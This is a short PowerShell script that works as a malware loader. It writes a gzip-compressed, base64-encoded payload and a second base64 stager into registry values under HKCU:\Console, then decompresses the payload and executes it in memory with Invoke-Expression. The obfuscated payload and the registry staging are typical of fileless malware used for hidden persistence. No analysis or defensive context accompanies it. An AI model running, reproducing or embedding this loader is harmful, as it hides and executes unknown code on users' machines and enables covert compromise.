$code = "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"
Set-ItemProperty "HKCU:\Console\" -Name ContentScript -Value $code;

$base64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBHAHoAaQBwAFMAdAByAGUAYQBtACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AKAAsAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKABnAHAAIAAnAEgASwBDAFUAOgBcAEMAbwBuAHMAbwBsAGUAJwApAC4AQwBvAG4AdABlAG4AdABTAGMAcgBpAHAAdAApACkAKQAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA7AA=="
Set-ItemProperty "HKCU:\Console\" -Name EScript -Value $base64;

$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String($code));
IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();